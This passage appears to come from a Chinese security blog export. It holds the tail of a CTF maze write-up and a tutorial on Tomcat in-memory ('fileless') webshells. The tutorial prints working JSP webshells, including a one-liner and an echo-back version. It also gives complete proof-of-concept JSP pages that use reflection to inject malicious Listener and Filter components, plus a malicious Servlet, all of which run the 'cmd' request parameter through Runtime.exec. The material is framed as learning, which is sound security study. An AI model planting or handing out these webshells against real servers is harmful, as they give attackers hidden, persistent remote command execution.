#!/usr/bin/env python3from subprocess import Popenfrom time import sleepmazeId = &quot;f395eaa8-1d61-44e7-8e7a-8f3d73176408&quot;# Can tunnel through walls in specified direction if there&#x27;s at least# one empty space before the wall## Run, readjust position/direction as desired, repeat until flagurl = f&quot;http://localhost:6563/move?id=&#123;mazeId&#125;&amp;move=right&quot;for i in range(50):    Popen([&quot;curl&quot;, &quot;-X&quot;, &quot;POST&quot;, url])    sleep(.00)

变量url的move值要根据实际情况进行更改
然后多多尝试，脚本多运行运行，一次是成功不了的
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>java内存马学习</title>
    <url>/2025/05/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[基础知识Java内存马系列-01-基础内容学习
JSP在正式学习内存马之前，我们先来简单了解一下jsp
JSP环境搭建根据网上一位师傅的文章进行搭建的：Servlet 项目搭建
JSP的语法脚本程序脚本程序可以包含任意量的Java语句、变量、方法或表达式，只要它们在脚本语言中是有效的。脚本程序的格式如下
&lt;% 代码片段 %&gt;

其等价于下面的XML语句
&lt;jsp:scriptlet&gt;   代码片段&lt;/jsp:scriptlet&gt;

下面是使用示例
&lt;%@ page contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; %&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;JSP - Hello World&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;&lt;%= &quot;Hello World!&quot; %&gt;&lt;/h1&gt;&lt;br/&gt;&lt;h2&gt;Hello World!!!&lt;/h2&gt;&lt;% out.println(&quot;GoodBye!&quot;); %&gt;&lt;/body&gt;&lt;/html&gt;


JSP声明一个声明语句可以声明一个或多个变量、方法，供后面的Java代码使用。JSP声明语句格式如下
&lt;%! 声明  %&gt;

同样等价于下面的XML语句
&lt;jsp:declaration&gt;   代码片段&lt;/jsp:declaration&gt;

下面是使用示例
&lt;html&gt;&lt;body&gt;&lt;h2&gt;Hello World!!!&lt;/h2&gt;&lt;%! String s= &quot;GoodBye!&quot;; %&gt;&lt;% out.println(s); %&gt;&lt;/body&gt;&lt;/html&gt;

JSP表达式如果JSP表达式中为一个对象，则会自动调用其toString()方法。格式如下，注意表达式后没有;
&lt;%= 表达式  %&gt;

等价于下面的XML表达式
&lt;jsp:expression&gt;   表达式&lt;/jsp:expression&gt;

下面是使用示例
&lt;html&gt;&lt;body&gt;&lt;h2&gt;Hello World!!!&lt;/h2&gt;&lt;p&gt;&lt;% String name = &quot;Sherlock&quot;; %&gt;username:&lt;%=name%&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;


JSP指令JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令



指令
描述



&lt;%@ page … %&gt;
定义页面的依赖属性，比如脚本语言、error页面、缓存需求等等


&lt;%@ include … %&gt;
包含其他文件


&lt;%@ taglib … %&gt;
引入标签库的定义，可以是自定义标签


比如我们能通过page指令来设置jsp页面的编码格式：&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
 &lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;Hello World!!!&lt;/h2&gt;&lt;p&gt;&lt;% String name = &quot;枫&quot;; %&gt;用户名：&lt;%=name%&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;

JSP注释格式如下
&lt;%-- 注释内容 --%&gt;

JSP内置对象JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下

由 JSP 规范提供，不用编写者实例化
通过 Web 容器实现和管理
所有 JSP 页面均可使用
只有在脚本元素的表达式或代码段中才能使用




对象
类型
描述



request
javax.servlet.http.HttpServletRequest
获取用户请求信息


response
javax.servlet.http.HttpServletResponse
响应客户端请求，并将处理信息返回到客户端


response
javax.servlet.jsp.JspWriter
输出内容到 HTML 中


session
javax.servlet.http.HttpSession
用来保存用户信息


application
javax.servlet.ServletContext
所有用户共享信息


config
javax.servlet.ServletConfig
这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数


pageContext
javax.servlet.jsp.PageContext
JSP 的页面容器，用于访问 page、request、application 和 session 的属性


page
javax.servlet.jsp.HttpJspPage
类似于 Java 类的 this 关键字，表示当前 JSP 页面


exception
java.lang.Throwable
该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象


JSP木马我们先来看看传统的JSP木马是如何实现的
&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;

上面是最简单的一句话木马，没有回显，适合用来反弹shell。下面是一个带回显的JSP木马
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;% if(request.getParameter(&quot;cmd&quot;)!=null)&#123;    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();     BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));    String line;    PrintWriter printWriter = response.getWriter();    printWriter.write(&quot;&lt;pre&gt;&quot;);    while ((line = bufferedReader.readLine()) != null)&#123;        printWriter.println(line);    &#125;    printWriter.write(&quot;&lt;/pre&gt;&quot;); &#125;%&gt;

传统的JSP木马特征性强，且需要文件落地，容易被查杀。因此现在出现了内存马技术。Java内存马又称”无文件马”，相较于传统的JSP木马，其最大的特点就是无文件落地，存在于内存之中，隐蔽性强。
Java内存马按照实现原理大致可以分为如下两种

利用Java Web组件：动态添加恶意组件，如Servlet、Filter、Listener等。在Spring框架下就是Controller、Intercepter。
修改字节码：利用Java的Instrument机制，动态注入Agent，在Java内存中动态修改字节码，在HTTP请求执行路径中的类中添加恶意代码，可以实现根据请求的参数执行任意代码。

Tomcat 中的三个 Context 的理解Contextcontext是上下文的意思，在java中经常能看到这个东西。那么到底是什么意思呢？
根据yzddmr6师傅的理解，如果把某次请求比作电影中的事件，那么context就相当于事件发生的背景。例如一部电影中的某个镜头中，张三大喊“奥利给”，但是只看这一个镜头我们不知道到底发生了什么，张三是谁，为什么要喊“奥利给”。所以就需要交代当时事情发生的背景。张三是吃饭前喊的奥利给？还是吃饭后喊的奥利给？因为对于同一件事情：张三喊奥利给这件事，发生的背景不同意义可能是不同的。吃饭前喊奥利给可能是饿了的意思，吃饭后喊奥利给可能是说吃饱了的意思。
在WEB请求中也如此，在一次request请求发生时，背景，也就是context会记录当时的情形：当前WEB容器中有几个filter，有什么servlet，有什么listener，请求的参数，请求的路径，有没有什么全局的参数等等。
ServletContextServlet规范中规定了一个ServletContext接口，其用来保存一个Web应用中所有Servlet的上下文信息，可以通过ServletContext来对某个Web应用的资源进行访问和操作。其在Java中的具体实现是javax.servlet.ServletContext接口
package javax.servlet;  import java.io.InputStream;import java.net.MalformedURLException;import java.net.URL;import java.util.Enumeration;import java.util.EventListener;import java.util.Map;import java.util.Set;import javax.servlet.ServletRegistration.Dynamic;import javax.servlet.descriptor.JspConfigDescriptor;  public interface ServletContext &#123;    String TEMPDIR = &quot;javax.servlet.context.tempdir&quot;;     String getContextPath();    ServletContext getContext(String var1);    int getMajorVersion();    int getMinorVersion();    int getEffectiveMajorVersion();    int getEffectiveMinorVersion();    String getMimeType(String var1);    Set getResourcePaths(String var1);    URL getResource(String var1) throws MalformedURLException;    InputStream getResourceAsStream(String var1);    RequestDispatcher getRequestDispatcher(String var1);    RequestDispatcher getNamedDispatcher(String var1);    /** @deprecated */    Servlet getServlet(String var1) throws ServletException;    /** @deprecated */    Enumeration getServlets();    /** @deprecated */    Enumeration getServletNames();    void log(String var1);    /** @deprecated */    void log(Exception var1, String var2);    void log(String var1, Throwable var2);    String getRealPath(String var1);    String getServerInfo();    String getInitParameter(String var1);    Enumeration getInitParameterNames();    boolean setInitParameter(String var1, String var2);    Object getAttribute(String var1);    Enumeration getAttributeNames();     void setAttribute(String var1, Object var2);     void removeAttribute(String var1);     String getServletContextName();        Dynamic addServlet(String var1, String var2);     Dynamic addServlet(String var1, Servlet var2);      Dynamic addServlet(String var1, Class var2);      extends Servlet&gt; T createServlet(Classvar1) throws ServletException;     ServletRegistration getServletRegistration(String var1);     Map ? extends ServletRegistration&gt; getServletRegistrations();     javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2);     javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2);     javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class var2);      extends Filter&gt; T createFilter(Classvar1) throws ServletException;    FilterRegistration getFilterRegistration(String var1);    Map ? extends FilterRegistration&gt; getFilterRegistrations();    SessionCookieConfig getSessionCookieConfig();    void setSessionTrackingModes(Setvar1);     Set getDefaultSessionTrackingModes();     Set getEffectiveSessionTrackingModes();     void addListener(String var1);     extends EventListener&gt; void addListener(T var1);     void addListener(Class var1);     extends EventListener&gt; T createListener(Classvar1) throws ServletException;    JspConfigDescriptor getJspConfigDescriptor();    ClassLoader getClassLoader();    void declareRoles(String... var1);&#125;

可以看到ServletContext接口中定义了很多操作，能对Servlet中的各种资源进行访问、添加、删除等
ApplicationContext在Tomcat中，ServletContext接口的具体实现就是ApplicationContext类，其实现了ServletContext接口中定义的一些方法

Tomcat这里使用了门面模式，对ApplicationContext类进行了封装，我们调用getServletContext()方法获得的其实是ApplicationContextFacade类
public ApplicationContextFacade(ApplicationContext context) &#123;        super();        this.context = context;         classCache = new HashMap&lt;&gt;();        objectCache = new ConcurrentHashMap&lt;&gt;();        initClassCache();    &#125;

ApplicationContextFacade类方法中都会调用this.context相应的方法，因此最终调用的还是ApplicationContext类的方法
StandardContextorg.apache.catalina.core.StandardContext是子容器Context的标准实现类，其中包含了对Context子容器中资源的各种操作。四种子容器都有其对应的标准实现如下

而在ApplicationContext类中，对资源的各种操作实际上是调用了StandardContext中的方法

总结我们可以用一张图来表示各Context的关系

ServletContext接口的实现类为ApplicationContext类和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context
Tomcat内存马Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中
而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上
Listener型根据以上思路，我们的目标就是在服务器中动态注册一个恶意的Listener。而Listener根据事件源的不同，大致可以分为如下几种

ServletContextListener：对Servlet上下文的创建和销毁进行监听； ServletContextAttributeListener：监听 Servlet 上下文属性的添加、删除和替换；
HttpSessionListener：对 Session 对象中属性的添加、删除和替换进行监听
ServletRequestListener：对请求对象的初始化和销毁进行监听； ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听
HttpSessionListener：对 Session 的创建和销毁进行监听。Session 的销毁有两种情况，一个中 Session 超时，还有一种是通过调用 Session 对象的 invalidate() 方法使 session 失效

很明显，ServletRequestListener是最适合用来作为内存马的。因为ServletRequestListener是用来监听ServletRequest对象的，当我们访问任意资源时，都会触发ServletRequestListener#requestInitialized()方法。下面是一个恶意的Listener
package Listener;import javax.servlet.ServletRequestEvent;import javax.servlet.ServletRequestListener;import javax.servlet.annotation.WebListener;import javax.servlet.http.HttpServletRequest;import java.io.IOException;@WebListenerpublic class Shell_Listener implements ServletRequestListener&#123;    @Override    public void requestInitialized(ServletRequestEvent sre) &#123;        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();        String cmd = request.getParameter(&quot;cmd&quot;);        if (cmd != null) &#123;            try &#123;                Runtime.getRuntime().exec(cmd);            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125; catch (NullPointerException n) &#123;                n.printStackTrace();            &#125;        &#125;    &#125;&#125;

访问任意路由都可进行恶意的get传参执行弹计算器

接下来就是要看如何把该恶意的Listener动态注册进服务器了，所以我们需要分析一下Listener的创建过程
创建过程先下一个断点，再进行调试，调用栈如下所示
requestInitialized:13, Shell_Listener (Listener)fireRequestInitEvent:5157, StandardContext (org.apache.catalina.core)invoke:116, StandardHostValve (org.apache.catalina.core)invoke:93, ErrorReportValve (org.apache.catalina.valves)invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)invoke:74, StandardEngineValve (org.apache.catalina.core)service:346, CoyoteAdapter (org.apache.catalina.connector)service:388, Http11Processor (org.apache.coyote.http11)process:63, AbstractProcessorLight (org.apache.coyote)process:936, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:52, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang)

我们一步步往上看，首先是StandardContext#fireRequestInitEvent调用了我们的Listener，我们跟进看一手
public boolean fireRequestInitEvent(ServletRequest request) &#123;    Object instances[] = getApplicationEventListeners();    if ((instances != null) &amp;&amp; (instances.length &gt; 0)) &#123;        ServletRequestEvent event =                new ServletRequestEvent(getServletContext(), request);        for (int i = 0; i &lt; instances.length; i++) &#123;            if (instances[i] == null)                continue;            if (!(instances[i] instanceof ServletRequestListener))                continue;            ServletRequestListener listener =                (ServletRequestListener) instances[i];            try &#123;                listener.requestInitialized(event);            &#125; catch (Throwable t) &#123;                ExceptionUtils.handleThrowable(t);                getLogger().error(sm.getString(                        &quot;standardContext.requestListener.requestInit&quot;,                        instances[i].getClass().getName()), t);                request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);                return false;            &#125;        &#125;    &#125;    return true;&#125;

关键代码有两处，首先通过getApplicationEventListeners()获取一个Listener数组

再跟进applicationEventListenersList发现Listener是存储在*applicationEventListenersList*属性中的

并且我们可以通过StandardContext#addApplicationEventListener()方法来添加Listener
public void addApplicationEventListener(Object listener) &#123;        applicationEventListenersList.add(listener);    &#125;

第二处就是遍历数组调用listener.requestInitialized(event)方法触发Listener
获取StandardContext类继续往上走，在调用StandardContext#fireRequestInitEvent方法之前我们需要先创建一个StandardContext对象，看堆栈是在StandardHostValve#invoke中，可以看到其通过request对象来获取StandardContext类

同样地，由于JSP内置了request对象，我们也可以使用同样的方式来获取
&lt;%    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);    reqF.setAccessible(true);    Request req = (Request) reqF.get(request);    StandardContext context = (StandardContext) req.getContext();%&gt;

还有另一种获取方式如下
&lt;%	WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();%&gt;

而恶意的Listener如下
&lt;%!    public class Shell_Listener implements ServletRequestListener &#123;         public void requestInitialized(ServletRequestEvent sre) &#123;            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();            String cmd = request.getParameter(&quot;cmd&quot;);            if (cmd != null) &#123;                try &#123;                    Runtime.getRuntime().exec(cmd);                &#125; catch (IOException e) &#123;                    e.printStackTrace();                &#125; catch (NullPointerException n) &#123;                    n.printStackTrace();                &#125;            &#125;        &#125;         public void requestDestroyed(ServletRequestEvent sre) &#123;        &#125;    &#125;%&gt;

最后添加该Listener
&lt;%	Shell_Listener shell_Listener = new Shell_Listener();    context.addApplicationEventListener(shell_Listener);%&gt;

完整poc从上述分析我们就可以总结出来实现Listener木马的步骤如下：

首先我们需要先获取一个StandardContext类
接着我们需要写一个恶意的Listener
最后我们要把该Listener添加进去

所以完整的poc如下
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt; &lt;%!    public class Shell_Listener implements ServletRequestListener &#123;         public void requestInitialized(ServletRequestEvent sre) &#123;            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();           String cmd = request.getParameter(&quot;cmd&quot;);           if (cmd != null) &#123;               try &#123;                   Runtime.getRuntime().exec(cmd);               &#125; catch (IOException e) &#123;                   e.printStackTrace();               &#125; catch (NullPointerException n) &#123;                   n.printStackTrace();               &#125;            &#125;        &#125;         public void requestDestroyed(ServletRequestEvent sre) &#123;        &#125;    &#125;%&gt;&lt;%    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);    reqF.setAccessible(true);    Request req = (Request) reqF.get(request);    StandardContext context = (StandardContext) req.getContext();     Shell_Listener shell_Listener = new Shell_Listener();    context.addApplicationEventListener(shell_Listener);%&gt;

我们测试一手，先访问Listener.jsp页面，让其代码进行加载

此时Tomcat已经添加了我们恶意的Listener，访问任意路由即可触发

Filter型仿照Listener型内存马的实现思路，我们同样能实现Filter型内存马
当多个 Filter 同时存在的时候，组成了 Filter 链。Web 服务器根据 Filter 在 web.xml 文件中的注册顺序，决定先调用哪个 Filter。当第一个 Filter 的 doFilter 方法被调用时，web服务器会创建一个代表 Filter 链的 FilterChain 对象传递给该方法，通过判断 FilterChain 中是否还有 Filter 决定后面是否还调用 Filter

我们先写一个恶意的Filter
package Filter; import javax.servlet.*;import javax.servlet.annotation.WebFilter;import java.io.IOException; @WebFilter(&quot;/*&quot;)public class Shell_Filter implements Filter &#123;    @Override    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;        String cmd = request.getParameter(&quot;cmd&quot;);        if (cmd != null) &#123;            try &#123;                Runtime.getRuntime().exec(cmd);            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125; catch (NullPointerException n) &#123;                n.printStackTrace();            &#125;        &#125;        chain.doFilter(request, response);    &#125;&#125;

测试，成功弹出计算器

那么我们接下来一样是要看下它的创建过程
Filter调用分析打上断点，调用栈如下：
doFilter:11, Shell_Filter (Filter)internalDoFilter:168, ApplicationFilterChain (org.apache.catalina.core)doFilter:144, ApplicationFilterChain (org.apache.catalina.core)invoke:168, StandardWrapperValve (org.apache.catalina.core)invoke:90, StandardContextValve (org.apache.catalina.core)invoke:482, AuthenticatorBase (org.apache.catalina.authenticator)invoke:130, StandardHostValve (org.apache.catalina.core)invoke:93, ErrorReportValve (org.apache.catalina.valves)invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)invoke:74, StandardEngineValve (org.apache.catalina.core)service:346, CoyoteAdapter (org.apache.catalina.connector)service:388, Http11Processor (org.apache.coyote.http11)process:63, AbstractProcessorLight (org.apache.coyote)process:936, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:52, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang)

跟进ApplicationFilterChain#internalDoFilter
private void internalDoFilter(ServletRequest request,                                  ServletResponse response)        throws IOException, ServletException &#123;         // Call the next filter if there is one        if (pos &lt; n) &#123;            ApplicationFilterConfig filterConfig = filters[pos++];            try &#123;                Filter filter = filterConfig.getFilter();                 if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(                        filterConfig.getFilterDef().getAsyncSupported())) &#123;                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);                &#125;                if( Globals.IS_SECURITY_ENABLED ) &#123;                    final ServletRequest req = request;                    final ServletResponse res = response;                    Principal principal =                        ((HttpServletRequest) req).getUserPrincipal();                     Object[] args = new Object[]&#123;req, res, this&#125;;                    SecurityUtil.doAsPrivilege (&quot;doFilter&quot;, filter, classType, args, principal);                &#125; else &#123;                    filter.doFilter(request, response, this);                &#125;            &#125; ...    &#125;

在该函数里面调用了doFilter方法，而filter是通过filterConfig.getFilter()获得的，filterConfig是通过ApplicationFilterConfig filterConfig = filters[pos++];获取到的
一个filterConfig对应一个Filter，用于存储Filter的上下文信息。这里的*filters*属性是一个ApplicationFilterConfig数组
所以我们要看*ApplicationFilterChain.filters*数组是怎么获取到的，其定义如下
private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];

跟一下，是在ApplicationFilterChain#addFilter函数中进行的赋值
void addFilter(ApplicationFilterConfig filterConfig) &#123;    // Prevent the same filter being added multiple times    for(ApplicationFilterConfig filter:filters)        if(filter==filterConfig)            return;    if (n == filters.length) &#123;        ApplicationFilterConfig[] newFilters =            new ApplicationFilterConfig[n + INCREMENT];        System.arraycopy(filters, 0, newFilters, 0, n);        filters = newFilters;    &#125;    filters[n++] = filterConfig;&#125;

查找该函数的用法，在ApplicationFilterChain#createFilterChain中初始化了一个ApplicationFilterChain类
public static ApplicationFilterChain createFilterChain(ServletRequest request,            Wrapper wrapper, Servlet servlet) &#123;         ...        // Request dispatcher in use        filterChain = new ApplicationFilterChain();         filterChain.setServlet(servlet);        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());         // Acquire the filter mappings for this Context        StandardContext context = (StandardContext) wrapper.getParent();        FilterMap filterMaps[] = context.findFilterMaps();         ...         String servletName = wrapper.getName();         // Add the relevant path-mapped filters to this filter chain        for (FilterMap filterMap : filterMaps) &#123;                        ...            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)                    context.findFilterConfig(filterMap.getFilterName());            ...             filterChain.addFilter(filterConfig);        &#125;         ...         // Return the completed filter chain        return filterChain;    &#125;

而该函数的调用就在在StandardWrapperValve#invoke()方法中，位于调用栈里面
分析一波createFilterChain函数，能够清晰地看到filterChain对象的创建过程

首先通过filterChain = new ApplicationFilterChain()创建一个空的filterChain对象
然后通过wrapper.getParent()函数来获取StandardContext对象
接着获取StandardContext中的FilterMaps对象，FilterMaps对象中存储的是各Filter的名称路径等信息
最后根据Filter的名称，在StandardContext中获取FilterConfig
通过filterChain.addFilter(filterConfig)将一个filterConfig添加到filterChain中

上述步骤中filterConfig是通过(ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());
获取到的，跟进findFilterConfig方法
public FilterConfig findFilterConfig(String name) &#123;    return (filterConfigs.get(name));&#125;

是从StandardContext的属性filterConfigs中获取到的filterConfig
filterConfigs的定义如下

看手ApplicationFilterConfig类是如何构建的，下面写内存马的时候会用到

FilterConfigs、FilterDefs和FilterMaps跟进到createFilterChain函数中，我们能看到此时的上下文对象StandardContext实际上是包含了这三者的

其中filterConfigs包含了当前的上下文信息StandardContext、以及filterDef等信息

在这其中filterDef存放了filter的定义，包括filterClass、filterName等信息。对应的其实就是web.xml中的&lt;filter&gt;标签

&lt;filter&gt;    &lt;filter-name&gt;&lt;/filter-name&gt;    &lt;filter-class&gt;&lt;/filter-class&gt;&lt;/filter&gt;

filterDef必要的属性为filter、filterClass以及filterName
filterDefs是一个HashMap，以键值对的形式存储filterDef
\
filterMaps中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的&lt;filter-mapping&gt;标签

&lt;filter-mapping&gt;    &lt;filter-name&gt;&lt;/filter-name&gt;    &lt;url-pattern&gt;&lt;/url-pattern&gt;&lt;/filter-mapping&gt;

filterMaps必要的属性为dispatcherMapping、filterName、urlPatterns
于是下面的工作就是构造含有恶意filter的FilterMaps和FilterConfig对象，并将FilterConfig添加到filter链中了。
动态注册Filter经过上面的分析，我们可以总结出动态添加恶意Filter的思路

获取StandardContext对象
创建恶意Filter
使用FilterDef对Filter进行封装，并添加必要的属性
创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中
使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中

获取StandardContext对象StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。
Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。
//获取ApplicationContextFacade类ServletContext servletContext = request.getSession().getServletContext(); //反射获取ApplicationContextFacade类属性context为ApplicationContext类Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);appContextField.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext); //反射获取ApplicationContext类属性context为StandardContext类Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);standardContextField.setAccessible(true);StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

创建恶意Filterpublic class Shell_Filter implements Filter &#123;        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;        String cmd=request.getParameter(&quot;cmd&quot;);        try &#123;            Runtime.getRuntime().exec(cmd);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;catch (NullPointerException n)&#123;            n.printStackTrace();        &#125;    &#125;&#125;

使用FilterDef封装filter//filter名称String name = &quot;CommonFilter&quot;;FilterDef filterDef = new FilterDef();filterDef.setFilter(filter);filterDef.setFilterName(name);filterDef.setFilterClass(filter.getClass().getName());standardContext.addFilterDef(filterDef);

创建filterMapfilterMap用于filter和路径的绑定，即动态配置访问内存马的路由
FilterMap filterMap = new FilterMap();filterMap.addURLPattern(&quot;/*&quot;);filterMap.setFilterName(name);filterMap.setDispatcher(DispatcherType.REQUEST.name());standardContext.addFilterMapBefore(filterMap);

封装filterConfig及filterDef到filterConfigsField Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);Configs.setAccessible(true);Map filterConfigs = (Map) Configs.get(standardContext);    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);constructor.setAccessible(true);ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);filterConfigs.put(name, filterConfig);

完整POC&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page import=&quot;java.util.Map&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;  &lt;%    ServletContext servletContext = request.getSession().getServletContext();    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appContextField.setAccessible(true);    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    standardContextField.setAccessible(true);    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);%&gt; &lt;%! public class Shell_Filter implements Filter &#123;        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;            String cmd = request.getParameter(&quot;cmd&quot;);            if (cmd != null) &#123;                try &#123;                    Runtime.getRuntime().exec(cmd);                &#125; catch (IOException e) &#123;                    e.printStackTrace();                &#125; catch (NullPointerException n) &#123;                    n.printStackTrace();                &#125;            &#125;            chain.doFilter(request, response);        &#125;    &#125;%&gt; &lt;%    Shell_Filter filter = new Shell_Filter();    String name = &quot;CommonFilter&quot;;    FilterDef filterDef = new FilterDef();    filterDef.setFilter(filter);    filterDef.setFilterName(name);    filterDef.setFilterClass(filter.getClass().getName());    standardContext.addFilterDef(filterDef);      FilterMap filterMap = new FilterMap();    filterMap.addURLPattern(&quot;/*&quot;);    filterMap.setFilterName(name);    filterMap.setDispatcher(DispatcherType.REQUEST.name());    standardContext.addFilterMapBefore(filterMap);      Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);    Configs.setAccessible(true);    Map filterConfigs = (Map) Configs.get(standardContext);     Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);    constructor.setAccessible(true);    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);    filterConfigs.put(name, filterConfig);%&gt;

先访问jsp木马

在任意路由进行测试，成功弹出计算器

Servlet型首先要对Tomcat的架构有一定的了解

同样，先来一个恶意的Servlet
package Servlet; import javax.servlet.*;import javax.servlet.annotation.WebServlet;import java.io.IOException; @WebServlet(&quot;/shell&quot;)public class Shell_Servlet implements Servlet &#123;    @Override    public void init(ServletConfig config) throws ServletException &#123;     &#125;     @Override    public ServletConfig getServletConfig() &#123;        return null;    &#125;     @Override    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;        String cmd = req.getParameter(&quot;cmd&quot;);        if (cmd !=null)&#123;            try&#123;                Runtime.getRuntime().exec(cmd);            &#125;catch (IOException e)&#123;                e.printStackTrace();            &#125;catch (NullPointerException n)&#123;                n.printStackTrace();            &#125;        &#125;    &#125;     @Override    public String getServletInfo() &#123;        return null;    &#125;     @Override    public void destroy() &#123;     &#125;&#125;

测试之后成功弹出计算器
